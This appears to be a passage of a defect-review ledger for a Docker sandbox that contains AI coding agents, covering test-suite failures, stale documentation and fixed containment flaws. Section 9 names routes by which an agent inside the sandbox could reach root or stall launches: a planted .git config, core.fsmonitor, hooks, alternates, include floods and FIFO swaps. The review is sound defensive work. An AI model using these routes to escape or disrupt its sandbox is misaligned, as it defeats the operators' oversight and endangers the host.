- Found while fixing batch 7; it existed before, from ENV-4's fix in batch 2.
- Severity: HIGH (the floor job has been red since batch 2 merged, so it cannot flag a new floor regression; its other ~80 tests still run and pass) — Confidence: CONFIRMED from CI: `Tests` runs 40386214831 (`0065450`) and 40392002312 (`1a1b701`), job "Shell test suite (bash floor)".
- Location: `sandbox.sh: \`ERROR: the agent must not run as root (SANDBOX_UID=%s, SANDBOX_GID=%s).\``; `.github/workflows/hermetic-checks.yml`'s `suite-floor` job, and `verify-on-host.sh`'s floor `docker run`, both run `./tests/run-all.sh` as root in `ubuntu:22.04`.
- What's wrong: ENV-4's fix refuses a root agent identity, and `sandbox.sh` takes the identity from `id -u` by default. In a root container every test that launches `sandbox.sh` without setting `SANDBOX_UID`/`SANDBOX_GID` stops at the refusal. The 19 are test-architecture-path, container-name, docs-path, env-file, git-internals-ro, launcher-dir-ro, mariadb, mode-capabilities, mode-output-mounts, mongo, mysql, playwright, postgres, redis, repos-path, selinux-label, skill-char-budget, tool-config-mounts and tools-d. The suite is meant to run as root there: several tests have root-only branches (test-launcher-dir-ro.sh's `setpriv` cases).
- Not the fix, measured: exporting `SANDBOX_UID=1000 SANDBOX_GID=1000` for the whole run (what the refusal tells a root user to do) breaks three other tests that expect the identity to follow the invoking user: test-integration-lib.sh (`IT_LAUNCH_UID follows the invoking user`), test-launcher-dir-ro.sh T46, and test-falsify-historical.sh, whose oracle is test-integration-lib.sh. Measured as a non-root user with the variables exported; no root environment was available to measure as root.
- Fix direction: decide per test. Either a launching test sets a non-root identity of its own when `id -u` is 0, or the floor runs move to a non-root user and the root-only branches get a root run of their own. Verify as root (docs/superpowers/to-test.md, batch 7, "Root").

### TST-10: test-repo-git-reset.sh fails wherever git still creates `.git/branches` (git 2.34 and 2.43, so the floor image and Ubuntu 24.04)
- **Status: FIXED (batch 7 follow-up)** — `4cdd310`. The helper clones with `--template=`, so the clone's `.git`, and with it the volume's after a reset, has no `branches/`, `description`, `info/` or sample hooks. The assertion is unchanged.
- Found while fixing batch 7; it existed before, from batch 2's REPO-1 redesign.
- Severity: MEDIUM (red on a stock Ubuntu 22.04 or 24.04 host and in the floor job; CI's `suite` job, on GitHub's own git build, passes it) — Confidence: CONFIRMED (reproduced at `0065450` and at `1a1b701`, git 2.43.0).
- Location: `tests/test-repo-git-reset.sh: \`&& [[ ! -e "$W/.git/remotes" && ! -e "$W/.git/branches" ]]; then\``
- What's wrong: the assertion checks that a reset leaves no legacy `.git/remotes` or `.git/branches` behind. `reset` replaces the volume's `.git` with a fresh clone's, and git 2.34 and 2.43 still put an empty `branches/` in every new repository from their default template (`git init` lists `branches config description HEAD hooks info objects refs`). The reset worked: the secret commit was not fetched. The failure is `FAIL: legacy remote file was used (log: add first add shared-file ; out: ON|main …)`.
- Fix direction: clone with an empty template (`--template=` / `init.templateDir`), which also drops the sample hooks, or assert that `branches/` names no remote rather than that it is absent. Belongs with batch 4's repo-helper work (`repo-git-reset.sh`).

### TST-11: The ledger ratchet has failed on main since batch 2 with 19 unclassified repo-git-reset.sh survivors and one stale entry
- **Status: FIXED (TST-11 follow-up, 2026-10-27).** New assertions in `tests/test-repo-git-reset.sh` kill 14 of the 20 survivors. They cover:
  - the guess loop, which the old 5c case never reached, because the fresh clone does not read the volume's origin;
  - a primary that is not a branch name;
  - the clone's default branch, which reset must not leave behind;
  - a `reftable/` directory beside a `refs/heads` directory;
  - an unreadable tip;
  - stash traces without a reflog;
  - packed-refs lines that hold no ref;
  - the WARN lines a clean pull must not print;
  - the chown that pull runs, observed through a stub on PATH.

  Ledger entry 16 now holds the seven statuses nothing reads, and the stale `bfefa9b0…` entry is gone. Entry 20 is inspect's double-guarded count, and entry 21 is the report's `d964be5…`, both EQUIVALENT. A root run in `ubuntu:22.04` gave the same verdicts as the non-root one, so nothing needed ENV-DEPENDENT.
- Original finding (found while fixing batch 7; existed before it). Superseded in one point: its claim that the two root-only mutants are killed in CI and must be ENV-DEPENDENT was measured wrong. They survive as root too, and stay EQUIVALENT in entry 16. At `3ffc58d` (`Tests` run 40405941031) the job reports 22 problems: 20 `repo-git-reset.sh` survivors, the stale entry, and one new survivor, `ai-containers-report.sh:logic-flip:d964be591e6317022ad2b9c48f545682f57006ef`, which came with batch 4's change to that script. A run of the `repo-git-reset.sh` target alone as a non-root user (WSL2, after `4cdd310`) gives the same 20 plus two that CI kills, both on the root-only lines `[[ "$(id -u)" == "0" ]] || return 1` and `git config --global --add safe.directory "$1"`. Those two are ENV-DEPENDENT, and the fix must classify them that way.
- Severity: MEDIUM (the falsify job is red, so a new survivor anywhere would not stand out) — Confidence: CONFIRMED from CI: `Tests` run 40386214831, job "Mutation tier (falsify) + survivor-ledger ratchet", `20 problem(s)`.
- Location: `tests/falsify/survivors.txt` against `repo-git-reset.sh`, an active target since batch 2 redesigned it.
- What's wrong: 19 identities (cond-negate, logic-flip and return-flip) SURVIVED with no entry, and the entry `repo-git-reset.sh:logic-flip:bfefa9b0411d327b435d5cd8264b421dfcb5d714` names a mutant that no longer exists.
- Fix direction: kill or classify each survivor and delete the stale entry, in the same PR as batch 4's changes to `repo-git-reset.sh`, then re-score that target.

### TST-12: test-mongo.sh's no-AVX fake dumps core into the repository
- **Status: FIXED (batch 7)** — `5a4305b` (the fake sets `ulimit -c 0` before `kill -ILL $$`).
- Severity: LOW — Confidence: CONFIRMED (found as an untracked `core` after a full suite run while fixing batch 7; `bash tests/run-all.sh test-mongo` reproduces it wherever core dumps are on).
- Location: `tests/test-mongo.sh: \`kill -ILL $$\``
- What's wrong: D10's fake mongod sends itself a real SIGILL, and the kernel writes a `core` file into the working directory, which under `tests/run-all.sh` is the repository root. Nothing removes it, and `git status` shows it.

### TST-13: An interrupt does not stop either demonstrator; the cleanup runs and the next patch is applied and rebuilt
- **Status: FIXED (batch 7 follow-up)** — `494ee11`. `trap cleanup EXIT`, with INT exiting 130 and TERM 143, in both demonstrators. test-demonstrate-needs-rebuild.sh interrupts a run while a stub docker stands in for the build and requires exit 130 with no later step.
- Severity: LOW — Confidence: CONFIRMED (found running docs/superpowers/to-test.md's TST-7 interrupt on a Docker host).
- Also found and fixed in identical code on macOS/Colima, where `tests/test-demonstrate-interrupt.sh` was added: test-demonstrate-needs-rebuild.sh interrupts only that demonstrator, and the new test does the same for demonstrate-network-delivery-tiers.sh (red with the old trap, green with the fix). `tests/falsify/run.sh` has the same trap shape and was measured not to be affected: an INT to its process group 40 s into `--target tests/lib-layer-checks.sh --jobs 2` ended it within 2 s (rc 1), reported the 169 unrun mutants as no verdict, and left no processes behind.
- Location: `tests/integration/demonstrate-needs-rebuild.sh` and `tests/integration/demonstrate-network-delivery-tiers.sh`, both `trap cleanup EXIT INT TERM` before the fix (from bc83027, 2026-08-21).
- What's wrong: a trap on INT that does not exit runs the handler and lets the script go on. The cleanup reverts the mutation and removes the images, and then the loop starts the next patch: Ctrl-C during a multi-patch run applies the next mutation and starts its rebuild. Each further Ctrl-C costs one more patch.
- Evidence: a script with that trap and a three-step loop, interrupted in step 1, printed "cleanup ran" and then ran steps 2 and 3. The new hermetic check, before the fix: rc 1, with the preflight reported FAILED after the interrupt.

### TST-14: `wf_it_selections` silently skips a quoted `run:` value
- **Status: FIXED** (TST-14/15 follow-up, 2026-10-27). `_wf_it_awk()`'s `scan()` now records with guarded `?` any line where `integration` comes before the script name (run.sh) but is not a plain invocation — quoted, inside `bash -c`, through a variable (`"$GITHUB_WORKSPACE"/tests/…`), a `cd` into `tests/integration` before the script, a doubled slash, a plain-text mention outside a comment — and one holding a second invocation after the first one's arguments end; `wf_it_selections()` refuses it naming the step. A file named after the script past the arguments (`| tee tests/integration/run.sh.log`) is not a second invocation. It refuses rather than unquotes: each of those shapes needs its own reading, and a refusal is what the header promises for anything it cannot decide. Eight `unread_case` vectors in `tests/test-layer-checks-parser.sh` and one for the `tee` shape; the first five were each red on the old parser. A second invocation on one line was a sibling omission the review did not list: `run.sh --tags a; run.sh --tags b` recorded only `--tags a`. The review of this fix found no HIGH or MEDIUM; its two LOWs left open are TST-16 and TST-17.
- Found by the batch 7 follow-up review
- Severity: LOW (an omission in nightly still fails the whole-corpus check, so PR ⊆ nightly still holds) — Confidence: CONFIRMED (reproduced with a fixture workflow)
- Location: `tests/lib-layer-checks.sh: \`_wf_it_awk()\``. Its `scan()` needs a space, `;`, `&`, `|` or `(` before `tests/integration/run.sh`, and `key()` does not unquote a `run:` value.
- What's wrong: `run: "./tests/integration/run.sh --tags quoted"`, `run: '…'` and `run: bash -c './tests/integration/run.sh …'` give no record and no refusal. The function's header says everything it cannot decide is rc 1, never a quiet omission.
- Fix direction: refuse a `run:` line that mentions `tests/integration/run.sh` and yields no record, or unquote scalar `run:` values before scanning.

### TST-15: `wf_triggers_on` treats `pull_request_target` and `merge_group` as not PR-triggered
- **Status: FIXED** (TST-14/15 follow-up, 2026-10-27). The predicate is unchanged — `pull_request_target` still is not `pull_request`, as the parser's vectors say — and the claim that relied on it is widened instead: `tests/test-layer-containment.sh` now verifies an `exempt` row against `pull_request`, `pull_request_target` and `merge_group`, failing on the first it triggers on or on an unreadable `on:`. Demonstrated by adding each trigger to `release.yml`: the fixed test fails naming it; the old one passed `merge_group` as "verified NOT pull_request-triggered". `tests/layer-checks.conf`'s row-type comment still says "never runs on pull_request"; it is kept byte-identical with mgd-ai-containers' copy, so it changes there and here together.
- Found by the batch 7 follow-up review; a design choice batch 7 wrote down, in the parser test's "pull_request_target is not pull_request" vectors
- Severity: LOW — Confidence: CONFIRMED (by the test's own vectors)
- Location: `tests/lib-layer-checks.sh: \`wf_triggers_on()\``
- What's wrong: a workflow on `pull_request_target` or `merge_group` that runs checks on every PR or merge can be registered `exempt` and passes as "verified NOT pull_request-triggered". That is the bypass TST-6 closed, moved to a sibling trigger.
- Fix direction: have an `exempt` row also refuse `pull_request_target` and `merge_group`, or rename the claim to what is checked.

## 8. Documentation vs code

### DOC-1: sandbox.conf says commenting out a key disables it, but the next sync turns it back on
- **Status: FIXED (batch 4)** — with PRJ-2, `a3ff97a`; sandbox.conf's header now says sync never re-adds a commented-out key.
- Severity: MEDIUM — Confidence: CONFIRMED (reproduced)
- Location: `sandbox.conf: \`# Boolean components: set to ON to include, OFF (or comment out) to exclude.\``; `sync-to-projects.sh: \`grep -qE "^${key}=" "$project" 2>/dev/null || added+=("$key")\``
- Introduced: the header comment came in 96481ce (2026-04). It became wrong with a2ea3df (2026-07-24), which added the reconcile.
- What's wrong: `reconcile_sandbox_conf()` sees a commented-out key as missing, so it appends the upstream default.
- Failure scenario: a project disables Copilot by writing `#copilot=ON`. The same applies to claude-code, github-cli and bun, which are all ON upstream. The next `./sync-to-projects.sh` appends `copilot=ON` under a "New options synced from upstream" banner. The next `runme.sh` then rebuilds with Copilot back in, along with its allowlist fragment and its `~/.copilot` mount.
- Evidence:
  - Repro: `sed 's/^copilot=ON/#copilot=ON/' sandbox.conf > proj.conf; bash -c "source ./sync-to-projects.sh; reconcile_sandbox_conf $PWD/sandbox.conf proj.conf <emptydir>"`.
  - Output: `Reconciled sandbox.conf: appended 1 new key(s): copilot`.
  - The file then holds both `#copilot=ON` and `copilot=ON`.
- Fix direction: either change the comment to say "set OFF", or have the reconcile treat `^#\s*key=` as present.

### DOC-2: troubleshooting.md tells users to edit the Dockerfile to compile native gems; the right setting is `c-toolchain=ON`
- **Status: FIXED (batch 8)** — `4d53bc9` … `5da9aeb`.
- Severity: MEDIUM — Confidence: CONFIRMED
- Location: `docs/troubleshooting.md: \`add \`build-essential\` back to the Dockerfile if you need to install such gems at runtime\``
- Introduced: 41e820c (the README split). It went stale when 1c5e937 added `c-toolchain`.
- What's wrong: the page says only `ruby=` or `db-clients=` keep the compiler. `build.sh` also keeps it for `c-toolchain`: `build.sh: \`if has_versions ruby || has_versions db-clients || is_enabled c-toolchain; then\``.
- Failure scenario: a user edits the project's `.ai-containers/Dockerfile`. The Dockerfile is a shared file, so `sync-to-projects.sh` overwrites it on the next sync and the fix is lost without any message.
- Fix direction: point to `c-toolchain=ON` and to docs/components/c-toolchain.md.

### DOC-3: AGENTS.md says `project-init.sh` takes a path and a name, but it ignores all arguments
- **Status: FIXED (batch 4)** — `09fe510` (the arguments prefill the path and name prompts; input that runs out fails with a message); AGENTS.md says it is interactive.
- Severity: MEDIUM (raised from LOW in triage: scripted use exits 1 with no output; verified that project-init.sh never reads its positional arguments). Fix batch 4, not docs-only: either implement the documented arguments or change every documented call — Confidence: CONFIRMED (reproduced)
- Location:
  - `AGENTS.md: \`./project-init.sh /path/to/myproject [optional-name]\``
  - `sync-to-projects.sh: \`Run ./project-init.sh <project-path> to register one.\``
  - `ai-containers-report.sh: \`Run ./project-init.sh <path> first\``
- Introduced: f681647 / c094411. This predates the review window, but it is still in AGENTS.md at HEAD.
- What's wrong: `project-init.sh` never reads `$1`/`$2`. It always prompts for the path (`prompt_with_default "Project path"`).
- Failure scenario: an agent follows AGENTS.md and runs `./project-init.sh /tmp/x foo </dev/null`. It exits 1 with no output. `read -p` prints no prompt when stdin is not a TTY, and the failed `read` ends the script under `set -e`. Run interactively, the arguments are silently ignored.
- Evidence: `timeout 5 ./project-init.sh /tmp/nonexist-x foo </dev/null; echo rc=$?` prints `rc=1` and nothing else.
- Fix direction: either fix the usage lines (it is interactive only), or accept positional defaults.

### DOC-4: sandbox.conf says vale "self-updates in place"; it never updates
- **Status: FIXED (batch 8)** — `4d53bc9` … `5da9aeb`.
- Severity: LOW — Confidence: CONFIRMED
- Location: `sandbox.conf: \`(agent-tools-reconcile.sh), so \`--no-cache\` does not refresh it and it\`` / `self-updates in place`. AGENTS.md's agent-tier table row says `` `vale` | pinned download ``, and the reconcile header says `vale         pinned download`.
- Introduced: 4dc252c (sandbox.conf) and 2354abc (AGENTS.md).
- What's wrong: `agent-tools-reconcile.sh: \`if [[ -x "$home_root/bin/vale" ]]; then log "vale already present"; return 0; fi\``. Vale is fetched from `releases/latest` once per group and never refreshed. It is not pinned and does not self-update.
- Failure scenario: a user expects a newer Vale and never gets it. docs/components/vale.md and docs/agent-tools.md give the correct method (delete `~/.ai-tools/bin/vale` and restart), but sandbox.conf contradicts them.
- Fix direction: in both places, say "latest at first install, no self-update" and give the delete-and-restart method.

### DOC-5: AGENTS.md and the docs point to README.md sections that no longer exist
- **Status: FIXED (batch 8)** — `4d53bc9` … `5da9aeb`.
- Severity: LOW — Confidence: CONFIRMED
- Location:
  - `AGENTS.md: \`see the README "sandbox.conf schema versioning" section\`` (twice)
  - `sandbox.conf: \`See README "sandbox.conf schema versioning".\``
  - `bump-sandbox-version.sh: \`# Rules (see README "sandbox.conf schema versioning"):\``
  - `sync-to-projects.sh: \`ensured. See README "sandbox.conf schema versioning".\``
  - `AGENTS.md: \`See the README "Ruby (via rvm)" section\``
  - `group.sh: \`see the README "Container groups" section\``
  - `docs/multiple-projects.md: \`which [migrations](../README.md) it has had applied\``
- What's wrong: README.md is now an 86-line landing page with none of these sections. The content lives in docs/multiple-projects.md (`## sandbox.conf schema versioning`), docs/components/ruby.md and docs/groups.md.
- Failure scenario: an agent about to rename or remove a sandbox.conf key looks for the migration rules in README.md and does not find them.
- Fix direction: point each reference at the docs/ file that now holds the section.

### DOC-6: multiple-projects.md names sandbox.conf "runtime keys" `mode=` and `agents=` that do not exist
- **Status: FIXED (batch 8)** — `4d53bc9` … `5da9aeb`.
- Severity: LOW — Confidence: CONFIRMED
- Location: `docs/multiple-projects.md: \`build-time keys (\`ruby=\`, \`db-clients=\`) with runtime ones (\`mode=\`, \`agents=\`),\``
- Introduced: e930d21
- What's wrong: sandbox.conf has no `mode` or `agents` key, and nothing reads one. The network mode is `SANDBOX_MODE` in sandbox.env.
- Failure scenario: a user writes `mode=restricted` in sandbox.conf. It is ignored, and the project keeps starting in the mode sandbox.env sets.
- Fix direction: drop the example, or name `SANDBOX_MODE` in sandbox.env.

### DOC-7: docs describe `<group>/.rvm/` as a directory, but it is a Docker volume
- **Status: FIXED (batch 8)** — `4d53bc9` … `5da9aeb`.
- Severity: LOW — Confidence: CONFIRMED
- Location: the `.rvm/` entry in the layout tree in docs/groups.md, and the `<group>/.rvm/` row in the mount table in docs/repos-and-mounts.md.
- What's wrong: for every group except `host`, `sandbox.sh` mounts the volume `ai-containers-rvm-<group>`: `sandbox.sh: \`config_mount_flags+=(-v "$rvm_vol:$dev_home/.rvm")\``.
- Failure scenario: a user backs up, inspects or `rm -rf`s `~/.ai-containers/<group>/.rvm`. None of that affects the real Ruby installs. The volume is left orphaned, and only `./group.sh gc` cleans it up.
- Fix direction: describe it as a volume and point to `group.sh`.

### DOC-8: getting-started.md names the wrong GitHub downloads as the reason to set `GITHUB_TOKEN`
- **Status: FIXED (batch 8)** — `4d53bc9` … `5da9aeb`.
- Severity: LOW — Confidence: CONFIRMED
- What's wrong: it says vale and goreleaser are fetched from GitHub releases at build time. Vale installs at container start, and goreleaser comes from its apt repository. The real reason, the nvm and pyenv `git clone`s (see the README and AGENTS.md), is not mentioned there.
- Failure scenario: a user without those two tools concludes the token does not apply to them. They then hit the anonymous-throttling 401.

### DOC-9: resources.md says the resource variables apply to `restricted` and `discovery` only
- **Status: FIXED (batch 8)** — `4d53bc9` … `5da9aeb`.
- Severity: LOW — Confidence: CONFIRMED
- Location: `docs/resources.md: \`These variables affect \`restricted\` and \`discovery\` runs only\``
- What's wrong: `sandbox.sh` passes `--cpus` and the memory and nofile limits in every mode, including `open`.

### DOC-10: overview.md lists "Ruby (via rvm)" among what the Dockerfile builds
- **Status: FIXED (batch 8)** — `4d53bc9` … `5da9aeb`.
- Severity: LOW — Confidence: CONFIRMED
- What's wrong: Ruby is installed at container start into the group's rvm volume. Nothing Ruby-related is baked into the image, as AGENTS.md itself states.

### DOC-11: components/README.md says no agent CLI is baked into the image; Kiro is
- **Status: FIXED (batch 8)** — `4d53bc9` … `5da9aeb`.
- Severity: LOW — Confidence: CONFIRMED
- Location: `docs/components/README.md: \`The agent CLIs themselves are **not baked into the image**\``. This sits under a table that includes `kiro`.
- What's wrong: Kiro is baked (`Dockerfile: \`ARG INSTALL_KIRO=0\``), and the runtime list leaves it out (`sandbox-common.sh: \`for a in claude-code copilot codex gemini graphify vale mkdocs\``).
- Failure scenario: a user restarts the container or runs a plain `./build.sh` to get a newer Kiro. Only `./build.sh --no-cache` refreshes it.

### DOC-12: graphify.md says `~/.claude` is mounted from the host, so the skill appears "in every subsequent container"
- **Status: FIXED (batch 8)** — `4d53bc9` … `5da9aeb`.
- Severity: LOW — Confidence: CONFIRMED
- Location: `docs/components/graphify.md: \`Because \`~/.claude/\` is bind-mounted from the host\``
- What's wrong: the mount comes from the group (`"$group_root/.claude"`). It is the host's own `~/.claude` only when `AI_CONTAINER_GROUP=host`.
- Failure scenario: `graphify install` in a `default`-group container does not reach other groups, or Claude Code on the host.

### DOC-13: AGENTS.md's list of optional components omits `acli` and `db-clients`
- **Status: FIXED (batch 8)** — `4d53bc9` … `5da9aeb`.
- Severity: LOW — Confidence: CONFIRMED
- Location: `AGENTS.md: \`Optional components: \`copilot\`, ...\``
- What's wrong: both are sandbox.conf keys and are documented later in the file, but this list, which is presented as the whole set, leaves them out. The version-list keys (`node`, `python`, `ruby`, `rust`, `go`, `nvm-version`) are covered separately, so they are fine.

## 9. Found while fixing batches 1 and 2

Each fix batch was reviewed by an independent reviewer before it was merged, and every HIGH and MEDIUM those reviews found was fixed in the batch (batch 1 hotfix `5bbaacc` … `944eb0c`; batch 2 `a8824e8` … `e426e09`). What follows is what those reviews found and the batches left open, plus REPO-1, the one large defect batch 2 found and fixed outside its own findings. **Reviewed up to `e426e09`** (main, 2026-10-26).

### REPO-1: `repo.sh sync`/`reset` ran git as root, with the host's `~/.ssh` and an open network, on a `.git` the agent can write
- **Status: FIXED (batch 2)** — `1eac805` … `e426e09`; redesigned in `2a8d666` so that git never runs on the volume's own `.git`. Tests are in `tests/test-repo-git-reset.sh`, plus an end-to-end run as root in the seed image.
- Severity: HIGH. Confidence: CONFIRMED (reproduced: a deleted `.git/config` let a sync fetch any repository the host SSH key could read; `core.fsmonitor`, hooks, `commondir`, alternates, replace refs and planted symbolic refs each reached root in turn).
- Introduced: before the window. It was found by the batch 2 review (finding F6 of the first round).
- What changed: every mode of `repo-git-reset.sh` clones the volume's `ai-containers.source` URL into a private directory. The volume's refs are read as plain files, and its worktree is used only as a worktree. `reset` and `sync` finish by replacing the volume's `.git`. The rest of this section lists the LOWs that redesign left.

### GIT-2: The include walk is bounded per config but not per launch, so planted repositories can make every launch take minutes or hours
- **Status: FIXED (batch 9)** — `9bd3729` … `6a0b37f`: a launch-wide budget of 1000 include entries with a WARNING when it is hit; values over PATH_MAX inert; `_path_walk`/`_link_walk` bounded at 256 steps and 40 links, past which a way is reported as not followed to the end; `config.worktree` walked only where `extensions.worktreeConfig` is on, or when the common config cannot be read (test G38 and G40 on). Reviewed over 19 rounds; what those left open is GIT-6 on, in section 10.
- Severity: MEDIUM. Confidence: CONFIRMED (measured)
- Location: sandbox.sh: `if (( ++ient > 100 )); then icut=1; ii=${#ifile[@]}; break; fi` and `if (( ++ients > 1000 )); then icut=1; ii=${#ifile[@]}; break; fi` (as fixed; the launch-wide count was added in batch 9, and moved after the empty-value skip in batch 10), and `_path_walk()`.
- What's wrong: there are three problems.
  - Each config gets 100 include entries, and each git directory has two configs. `config.worktree` is walked whenever it exists, even with `extensions.worktreeConfig` off, when the host's git never reads it. A launch can protect up to `SANDBOX_GIT_MAX` (200) git directories, and the agent can plant all of them. The 1000-files-per-launch budget limits files, not entries.
  - `_path_walk` is quadratic in the number of path components, because it strips one component per step with `rest="${rest#*/}"`.
  - A config with exactly 100 entries never trips the cut, so it gets no WARNING.
- Evidence: the reviewer measured the launch time in three setups.
  - 150 planted repositories, each with 100 `include.path = /nonexistent/fN` lines in both configs, took 81 s to launch (13 s without the includes).
  - One config with 100 entries of 2,000 components each took 54 s.
  - One config with 10 entries of 8,000 components each took 71 s.
- Fix direction: add a launch-wide entry budget beside the file budget, with a WARNING when it is hit. Treat an include value longer than PATH_MAX as inert. Bound the steps of `_path_walk`/`_link_walk`, and treat an entry that hits the bound as exposed, with a warning. Walk `config.worktree` only where `extensions.worktreeConfig` is on, as the hooks check already does. G38 should plant many repositories and long paths, because its timing half alone does not catch a removed cap (5000 entries took 12 s, under its 15 s threshold).

### GIT-3: A gitlink skipped by the path checks is skipped silently
- **Status: FIXED (batch 9)** — `9bd3729` … `6a0b37f`: a skipped gitlink gets a `WARNING:` naming it, five per index and then a count.
- Severity: LOW. Confidence: PLAUSIBLE
- Location: sandbox.sh: `git_dirs_in()` (the `*/../*|*/./*|*//*` case and the `pwd -P` comparison on each gitlink path).
- What's wrong: the skip is correct for an agent-written index. It also fires, with nothing printed, in three legitimate cases:
  - a checkout whose on-disk name differs from the index (case on APFS, NFC against NFD on HFS+);
  - a submodule directory the launching user cannot search;
  - a checkout the user replaced with a symlink.
  If such a checkout sits under a pruned `vendor/` with an embedded `.git` directory, it is not protected, and nothing says so. The other "not followed" paths here do warn. Related and already documented under "Not covered" in AGENTS.md: a sparse index's gitlinks are not followed either.
- Fix direction: print a `WARNING:` naming the gitlink whenever either check skips one.

### GIT-4: A concurrent container can swap the index or a sharedindex file for a FIFO between the check and the read
- **Status: FIXED (batch 9)** — `9bd3729` … `6a0b37f`: `ls-files` runs under `timeout -k 2 10` where there is one, and a timeout counts as an unreadable index; every config read, `commondir` and `.git` file read only a regular file, and any FIFO or device inside what the launch binds read-only refuses it, the file binds checked again where the manifest records them.
- Severity: LOW. Confidence: PLAUSIBLE (with the guard removed, G37's hang ran to the 60 s timeout)
- Location: sandbox.sh: `_git_index_read()` (the `sharedindex` regular-file test, then `ls-files`).
- What's wrong: the guard checks, then uses. A second container on the same tree can replace `sharedindex.*`, or `index` itself, with a FIFO after the `-f` test, and the unbounded `ls-files` then hangs the launch. The gitlink `pwd -P` check has the same window against the host-side writes that follow it (`commondir`, `hooks/`, `config.worktree`). Mount time does not re-verify those writes, but what they write is benign.
- Fix direction: run the `ls-files` under a watchdog like the services runner's, and treat a timeout as an unreadable index.

### GIT-5: Nits in the include walk
- **Status: FIXED (batch 9)** — `9bd3729` … `6a0b37f`.
- Severity: NIT
- `ient > 100` counts empty-value entries too.
- `unset iseen; local -A iseen=()` deletes a caller's or a global `iseen` on the first pass (checked on bash 5.1 and 5.3). None exists today. `local -A iseen=()` followed by `iseen=()` avoids it.

### LNCH-4: An unrepresentable launcher candidate is not overlaid, yet everything nested in it is discounted from `SANDBOX_LAUNCHER_MAX`
- **Status: FIXED (batch 9)** — `9bd3729` … `6a0b37f`: representability is decided before counting, through the shared `_overlay_buildable`, so only an overlay that is made covers what is nested in it (test T46).
- Severity: LOW. Confidence: CONFIRMED (reproduced)
- Location: sandbox.sh: `lcand[${cat[i]}]="$i"` (as fixed; it read `lcand[${cat[i]}]=1` before batch 9).
- What's wrong: the rule is that only an overlay that is actually made covers what is nested in it. Mount roots are excluded from `lcand`, but a candidate that `_mount_representable` rejects is not. It gets "cannot protect … stays writable" and no overlay, yet its nested launchers are not counted.
- Evidence: a launcher named `bad$'\xff'` holding 3,000 nested launchers, with `SANDBOX_LAUNCHER_MAX=5`, exited 0 after 14 s with 3,001 WARNINGs. No extra bind mounts were made, because every nested path is unrepresentable too. The damage is a flood of WARNINGs that buries real ones, which is what the cap exists to bound.
- Fix direction: decide representability before counting, or count the overlays actually emitted.

### ENV-7: A committed `IMAGE_NAME` can retag another project's image
- **Status: FIXED (batch 10)** — `86427b0`, `162d4c3`: for an `IMAGE_NAME` the committed `sandbox.env` chose (`ai_containers_build_retag_guard()`), `build.sh` refuses, before anything is written, to retag an image with no `ai-containers.*` label key (one built before v0.6.0 is recognised by the Dockerfile's title and rebuilt with a NOTE) or one whose `ai-containers.project` label names another project that still exists, is not an absolute path, or lies under a directory you cannot search; one built before that label, or for a project path that no longer exists, is rebuilt with a NOTE. A committed `IMAGE_NAME` is a local name, no `/`; a different name given as `build.sh`'s argument is not checked (`86427b0` checked it; fixed after the review of `162d4c3`). The user's choice was to refuse another project's image, so this replaces the warning the fix on main (`c89f1d5`) gave (tests/test-image-retag.sh, which runs `build.sh` against a fake `docker`).
- Severity: LOW. Confidence: PLAUSIBLE (from code)
- Location: build.sh: `remove_replaced_image`. sandbox-common.sh: `env_value_portable()` refuses only the seed image.
- What's wrong: `IMAGE_NAME` stays portable. A committed `sandbox.env` can name a sibling project's tag, or a base image such as `ubuntu:24.04`. `./build.sh` then retags it with an image built from this project's `sandbox.conf` and `allowlist-*.d/custom.txt`, and removes the old image. The other project's next restricted launch then runs with this project's allowlist, and gets only a provenance warning.
- Fix direction: refuse a portable `IMAGE_NAME` that contains a registry host or `/`. Or warn, or refuse, when the existing tag carries no `ai-containers.*` label from this project. Or derive the name from the project.

### REPO-2: `sync` drops an `am`, merge, cherry-pick or revert that is still in progress
- **Status: FIXED (batch 4)** — `ec17745` (pull refuses `rebase-apply/`, `rebase-merge/`, `sequencer/`, `MERGE_HEAD`, `CHERRY_PICK_HEAD`, `REVERT_HEAD`, `BISECT_START`).
- Severity: LOW. Confidence: CONFIRMED (reproduced)
- Location: repo-git-reset.sh: `cmd_pull()`.
- What's wrong: `.git` is replaced, and with it `rebase-apply/`, `rebase-merge/`, `sequencer/`, `MERGE_HEAD`, `CHERRY_PICK_HEAD` and `REVERT_HEAD`. With `git am` stopped on patch 1 of 2, `pull` returned 0 and the two patches, which existed only in `rebase-apply/`, were gone. `git pull --ff-only` keeps that state.
- Fix direction: refuse when any of those names, or `BISECT_START`, exists in `.git`.

### REPO-3: A split index is refused with "use reset", which wipes far more than a sync would
- **Status: PARTLY FIXED (batch 4)** — `ec17745`: the refusal names `git update-index --no-split-index`; reading a split index from its copy is still not done.
- Severity: LOW. Confidence: CONFIRMED (reproduced)
- Location: repo-git-reset.sh: `cmd_pull()` (the staged-changes check reads a copy of the index without its `sharedindex.*`).
- What's wrong: a clean checkout with `core.splitIndex` on cannot be synced. The suggested `reset` drops untracked files and every other local branch.
- Fix direction: copy the regular `sharedindex.<oid>` the index names beside the copy, or tell the user to run `git update-index --no-split-index`.

### REPO-4: A reftable repository is misread by every mode, and `reset` deletes its branches without listing them
- **Status: FIXED (batch 4)** — `ec17745` (every mode refuses a reftable repository; checked against one made by git 2.56).
- Severity: LOW for now. It becomes MEDIUM if git makes reftable the default. Confidence: CONFIRMED (reproduced)
- Location: repo-git-reset.sh: `volume_refs()`, `cmd_inspect()`.
- What's wrong: a reftable `.git` has a stub file at `refs/heads` and no loose or packed refs.
  - `inspect` lists `BRANCH|/dst/.git/refs/heads|?|` and never names the real branches, so the confirmation shows none of them at risk.
  - `reset` then deletes them.
  - `pull` refuses with a misleading "cannot read the tip of .invalid".
- Fix direction: refuse any mode when `.git/reftable` exists or `refs/heads` is not a directory, with a message saying why.

### REPO-5: Refusing every nested `.git` also blocks common legitimate checkouts
